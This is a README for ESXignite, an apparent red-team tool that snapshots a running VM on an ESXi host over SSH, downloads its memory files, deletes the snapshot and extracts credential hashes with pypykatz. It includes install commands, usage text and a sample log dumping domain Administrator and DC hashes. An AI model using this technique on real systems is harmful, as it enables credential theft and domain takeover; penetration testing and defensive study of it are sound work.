# ESXignite

## Prerequisites

Install python dependencies
```
pip3 install -r requirements.txt
```

Manually install pypykatz
```
git clone https://github.com/skelsec/pypykatz.git
pip3 install ./pypykatz/
```

Clone the pypykatz volatility plugin
```
git clone https://github.com/skelsec/pypykatz-volatility3.git
```

## Output Example

```
[+] found VMID=3
[+] Creating snapshot for DC with VMID=3................
[+] Found SNAPSHOTID 54
[+] Searching for the folder of the VM DC
[+] Found the folder of the VM DC : ./vmfs/volumes/6877746a-47318091-36ab-000c29f86e52/DC
[+] Searching for the .vmem and .vmsn files of the snapshot 54
[+] Found the .vmem file of the snapshot 54 : DC-Snapshot54.vmem
[+] Found the .vmem file of the snapshot 54 : DC-Snapshot54.vmsn
[+] Downloading file : ./vmfs/volumes/6877746a-47318091-36ab-000c29f86e52/DC/DC-Snapshot54.vmem
[+] Memory dump successfully written at : ./DC-Snapshot54.vmem !
[+] Downloading file : ./vmfs/volumes/6877746a-47318091-36ab-000c29f86e52/DC/DC-Snapshot54.vmsn
[+] Memory dump successfully written at : ./DC-Snapshot54.vmsn !
[+] Removing the snapshot 54 of the VM : DC (VMID: 3).
[+] Snapshot 54 erased
[+] Dumping Secrets...
[*] MOTHERBASE\Administrator:fca070a8f2392d9174cb21e3601b929e
[*] MOTHERBASE\DC$:2277714426cc2e56f155b6690a141bc4
```

## Usage

```
      (        )                                 
      )\ )  ( /(                         )       
 (   (()/(  )\()) (   (  (        (   ( /(   (   
 )\   /(_))((_)\  )\  )\))(  (    )\  )\()) ))\  
((_) (_))  __((_)((_)((_))\  )\ )((_)(_))/ /((_) 
| __|/ __| \ \/ / (_) (()(_)_(_/( (_)| |_ (_))   
| _| \__ \  >  <  | |/ _` || ' \))| ||  _|/ -_)  
|___||___/ /_/\_\ |_|\__, ||_||_| |_| \__|\___|  
                     |___/ 
  
usage: ESXignite.py [-h] -t hostname -u user -p password -v vm_name

Create+extract the RAM of a running VM on an ESXi and extract it's secrets

options:
  -h, --help            show this help message and exit
  --target HOSTNAME, -t HOSTNAME
                        ESXi hostname/IP
  --username USERNAME, -u USERNAME
                        Username for ESXi SSH authication
  --password PASSWORD, -p PASSWORD
                        Password for ESXi SSH authentication
  --virtual-machine VM_NAME, -v VM_NAME
                        Virtual Machine name to dump secrets from
```
